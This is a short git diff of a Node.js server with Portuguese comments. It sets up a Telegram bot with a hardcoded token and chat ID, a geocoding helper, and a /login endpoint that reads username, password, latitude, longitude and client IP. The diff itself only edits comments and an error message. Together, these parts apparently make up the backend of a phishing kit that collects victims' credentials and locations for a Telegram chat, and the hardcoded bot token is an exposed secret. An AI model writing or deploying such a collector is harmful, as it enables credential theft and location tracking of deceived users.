@@ -12,7 +12,7 @@ const token = process.env.TOKEN || '7618938431:AAHrrR5AEdE4pirgLf_02TPX5hePY9tHb
 const chatId = process.env.CHAT_ID || '5114449108';
 const bot = new TelegramBot(token, { polling: false }); // Desativar polling
 
-// Configurar webhook (substitua pela URL do seu app no Render)
+// Configurar webhook (substitua pela URL do seu app no Render após o deploy)
 const webhookUrl = 'https://seu-app.onrender.com/telegram-webhook';
 bot.setWebHook(webhookUrl).then(() => {
     console.log(`Webhook configurado: ${webhookUrl}`);
@@ -26,7 +26,6 @@ app.post('/telegram-webhook', (req, res) => {
     res.sendStatus(200);
 });
 
-// Função para geocodificação
 async function getAddressFromCoordinates(latitude, longitude) {
     try {
         const response = await axios.get(
@@ -36,11 +35,10 @@ async function getAddressFromCoordinates(latitude, longitude) {
         return address;
     } catch (error) {
         console.error('Erro na geocodificação:', error.message);
-        return 'N/A';
+        return `Erro ao obter endereço: ${error.message}`;
     }
 }
 
-// Endpoint para login
 app.post('/login', async (req, res) => {
     const { username, password, latitude, longitude } = req.body;
     const clientIp = req.headers['x-forwarded-for'] || req.ip;
@@ -73,7 +71,6 @@ app.listen(process.env.PORT || 3000, () => {
     console.log(`Servidor rodando na porta ${process.env.PORT || 3000}`);
 });
 
-// Comandos do bot
 bot.onText(/\/getid/, (msg) => {
     const chatId = msg.chat.id;
     bot.sendMessage(chatId, `O Chat ID deste chat é: ${chatId}`);
